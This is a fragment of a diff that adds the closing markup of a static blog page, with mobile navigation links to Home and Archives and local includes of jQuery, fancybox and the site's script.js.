+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
